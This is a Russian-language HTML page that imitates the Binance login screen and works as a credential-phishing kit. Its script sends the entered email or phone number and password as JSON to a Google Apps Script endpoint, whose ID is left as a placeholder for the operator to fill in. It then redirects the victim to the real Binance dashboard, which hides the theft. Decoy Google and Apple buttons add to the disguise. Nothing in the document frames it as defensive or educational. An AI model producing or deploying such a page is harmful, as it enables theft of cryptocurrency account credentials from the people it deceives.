# Binance.
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Binance – Вход</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
<style>
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    background: #000;
    font-family: 'Poppins', sans-serif;
    color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    overflow-y: auto;
  }
  .login-wrapper {
    background: #121212;
    border-radius: 16px;
    padding: 40px 35px 50px;
    max-width: 400px;
    width: 100%;
    box-shadow: 0 0 30px #f3ba2f;
    text-align: center;
    animation: fadeIn 1s ease forwards;
    opacity: 0;
  }
  @keyframes fadeIn {
    to { opacity: 1; }
  }
  .logo {
    margin-bottom: 30px;
  }
  .logo img {
    width: 80px;
  }
  h1 {
    font-weight: 700;
    font-size: 28px;
    margin-bottom: 30px;
    color: #f3ba2f;
  }
  form {
    display: flex;
    flex-direction: column;
  }
  input {
    background: #222;
    border: none;
    border-radius: 8px;
    padding: 14px 16px;
    margin-bottom: 20px;
    color: #fff;
    font-size: 16px;
    outline: none;
    transition: box-shadow 0.3s ease;
  }
  input:focus {
    box-shadow: 0 0 8px #f3ba2f;
  }
  button.submit-btn {
    background: #f3ba2f;
    border: none;
    border-radius: 8px;
    padding: 14px;
    font-weight: 700;
    font-size: 16px;
    color: #000;
    cursor: pointer;
    transition: background 0.3s ease;
    margin-bottom: 15px;
  }
  button.submit-btn:hover {
    background: #d4a520;
  }
  .alt-login-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    background: #222;
    color: #f3ba2f;
    border: 1px solid #f3ba2f;
    border-radius: 8px;
    padding: 12px;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 15px;
    transition: background 0.3s ease, color 0.3s ease;
  }
  .alt-login-btn:hover {
    background: #f3ba2f;
    color: #000;
  }
  .alt-login-btn svg {
    width: 20px;
    height: 20px;
  }
  .extra {
    margin-top: 15px;
    font-size: 14px;
  }
  .extra a {
    color: #f3ba2f;
    text-decoration: none;
  }
  .extra a:hover {
    text-decoration: underline;
  }
  .message {
    margin-top: 10px;
    font-size: 14px;
  }
  .message.success {
    color: #6fda44;
  }
  .message.error {
    color: #ff5252;
  }
  footer {
    margin-top: 40px;
    font-size: 12px;
    color: #888888;
    text-align: center;
  }
  footer a {
    color: #f3ba2f;
    text-decoration: none;
    margin: 0 5px;
  }
  footer a:hover {
    text-decoration: underline;
  }
  @media (max-width: 480px) {
    .login-wrapper {
      padding: 30px 20px 40px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 25px;
    }
    input {
      font-size: 14px;
      padding: 12px 14px;
    }
    button.submit-btn,
    .alt-login-btn {
      font-size: 14px;
      padding: 12px;
    }
  }
</style>
</head>
<body>
  <div class="login-wrapper">
    <div class="logo">
      <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.svg?v=024" alt="Binance Logo" />
    </div>
    <h1>Войти в аккаунт</h1>
    <form id="loginForm">
      <input type="text" id="login" placeholder="Email или номер телефона" required autocomplete="username" />
      <input type="password" id="password" placeholder="Пароль" required autocomplete="current-password" />
      <button type="submit" class="submit-btn">Войти</button>
    </form>

    <button class="alt-login-btn" type="button" onclick="alert('Вход через Google пока недоступен')">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#f3ba2f"><path d="M21.35 11.1h-9.2v2.9h5.3c-.23 1.25-1.44 3.67-5.3 3.67-3.2 0-5.8-2.66-5.8-5.94 0-3.28 2.6-5.94 5.8-5.94 1.81 0 3.03.77 3.74 1.44l2.55-2.46C17.66 6.12 15.85 5.3 13.4 5.3 7.7 5.3 3.3 9.72 3.3 15.45c0 5.73 4.4 10.15 9.9 10.15 5.71 0 9.51-4.06 9.51-9.79 0-.66-.08-1.17-.36-1.61z"/></svg>
      Войти через Google
    </button>

    <button class="alt-login-btn" type="button" onclick="alert('Вход через Apple пока недоступен')">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#f3ba2f"><path d="M16.37 1.43c-.88.1-1.94.59-2.56 1.33-.55.64-1.04 1.65-.91 2.62 1.05.04 2.23-.65 2.9-1.4.56-.6.94-1.44.57-2.55zM20.33 12.88c-.05-3.25 2.8-4.8 2.93-4.88-1.6-2.34-4.1-2.66-5-2.7-2.12-.22-4.14 1.25-5.22 1.25-1.1 0-2.81-1.21-4.62-1.17-2.37.04-4.57 1.39-5.81 3.53-2.48 4.3-.63 10.65 1.79 14.14 1.19 1.78 2.6 3.77 4.44 3.7 1.8-.08 2.48-1.14 4.65-1.14 2.12 0 2.74 1.14 4.62 1.11 1.94-.03 3.15-1.8 4.29-3.57 1.36-2.07 1.92-4.08 1.95-4.18-.05-.02-3.73-1.43-3.78-5.67z"/></svg>
      Войти через Apple
    </button>

    <div class="extra">
      Нет аккаунта? <a href="#">Зарегистрироваться</a>
    </div>

    <div class="message" id="message"></div>
  </div>

  <footer>
    © 2017–2025 Binance. Все права защищены. &nbsp;|&nbsp;
    <a href="#">Условия использования</a> &nbsp;|&nbsp;
    <a href="#">Политика конфиденциальности</a>
  </footer>

<script>
  const form = document.getElementById('loginForm');
  const messageDiv = document.getElementById('message');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    messageDiv.textContent = '';
    const login = document.getElementById('login').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!login || !password) {
      messageDiv.textContent = 'Пожалуйста, заполните все поля.';
      messageDiv.className = 'message error';
      return;
    }

    // Замените этот URL на URL вашего Google Apps Script веб-приложения
    const googleScriptURL = 'https://script.google.com/macros/s/ВАШ_ID_СКРИПТА/exec';

    try {
      await fetch(googleScriptURL, {
        method: 'POST',
        mode: 'no-cors', // чтобы избежать проблем с CORS
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ login, password })
      });

      messageDiv.textContent = 'Данные успешно отправлены!';
      messageDiv.className = 'message success';

      form.reset();

      // Переадресация через 2 секунды (замени ссылку, если нужно)
      setTimeout(() => {
        window.location.href = 'https://www.binance.com/ru/my/dashboard'; 
      }, 2000);

    } catch (error) {
      messageDiv.textContent = 'Ошибка отправки данных. Попробуйте позже.';
      messageDiv.className = 'message error';
    }
  });
</script>
</body>
</html>
